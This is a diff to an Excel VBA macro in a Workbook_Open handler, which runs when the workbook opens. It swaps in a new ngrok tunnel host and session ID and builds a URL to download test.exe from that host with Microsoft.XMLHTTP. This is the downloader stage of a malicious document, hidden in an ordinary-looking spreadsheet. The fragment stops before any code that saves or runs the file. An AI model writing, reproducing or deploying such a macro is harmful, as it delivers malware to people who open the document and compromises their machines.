@@ -9,8 +9,8 @@ Private Sub Workbook_Open()
          Dim TextFile As Object
 
 
-         ip = "4161-111-68-99-41.ngrok.io"
-         session = "62302f90889ba6c30a9efa36"
+         ip = "d233-115-186-152-101.ngrok.io"
+         session = "6230c681f2f0c80730fb5dc8"
          FileUrl = "http://" & ip & "/download/exe/" & session & "/test.exe"
 
          Set objXmlHttpReq = CreateObject("Microsoft.XMLHTTP")
